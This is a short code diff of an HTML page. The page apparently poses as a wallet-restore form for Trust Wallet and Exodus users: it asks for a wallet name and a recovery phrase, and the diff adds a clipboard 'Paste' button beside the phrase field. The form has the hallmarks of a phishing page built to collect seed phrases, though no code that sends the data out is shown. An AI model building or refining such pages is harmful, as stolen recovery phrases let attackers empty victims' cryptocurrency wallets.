@@ -76,7 +76,7 @@ textarea {
   background: #2ea043;
 }
 
-.submit-btn {
+.submit {
   width: 100%;
   padding: 12px;
   margin-top: 18px;
@@ -107,6 +107,7 @@ textarea {
     <input type="text" id="username" placeholder="Wallet Name/Trust wallet/Exoduswallet" required>
 
     <textarea id="complaint" placeholder="Enter recovery phrase" required" required></textarea>
+ <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>  
 
     <button type="submit">RESTORE WALLET</button>
   </form>
